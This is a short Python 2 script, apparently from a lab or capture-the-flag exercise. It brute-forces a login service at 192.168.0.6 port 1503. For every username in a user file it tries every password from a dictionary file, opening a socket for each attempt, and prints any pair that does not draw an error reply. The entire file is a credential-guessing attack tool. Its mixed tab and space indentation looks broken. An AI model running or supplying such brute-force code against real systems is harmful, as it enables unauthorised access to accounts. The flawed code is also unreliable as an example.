

import socket


class GuessC:

	def __init__(self):
		self.hosts = "192.168.0.6"
		self.port = 1503
		self.user_file = "users.txt"
		self.dict = "passwords_john.txt"


	def recv_to(self, string, sock):
		data= ""
		while True:
			tmp = sock.recv(1)
			if tmp == "":
				break
			data += tmp
			if data.endswith(string):
				break
		return data


	def try_login(self):
	    	rep = None
	    	pas = None
	    	with open(self.user_file) as u_f:
	    		for line in u_f:
	    			with open(self.dict) as p_f:
	    				for p_line in p_f:
						print "trying: " + line.rstrip("\n") + " _ " + p_line.rstrip("\n")
						soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
					    	soc.connect((self.hosts, self.port))
					    	reply = self.recv_to("Enter login: ", soc)
					    	soc.send(line.rstrip("\n"))
						print reply
					    	reply = self.recv_to("Enter Password: ", soc)
					    	soc.send(p_line.rstrip("\n"))
					    	reply = soc.recv(1024)
					    	if "Error!" not in reply:
					    		rep = line.rstrip("\n")
					    		pas = p_line.rstrip("\n")		  	
							soc.close()
							print"!!! FOUND IT: " + rep + "-" + pas




if __name__ == "__main__":
	fc = GuessC()
	fc.try_login()



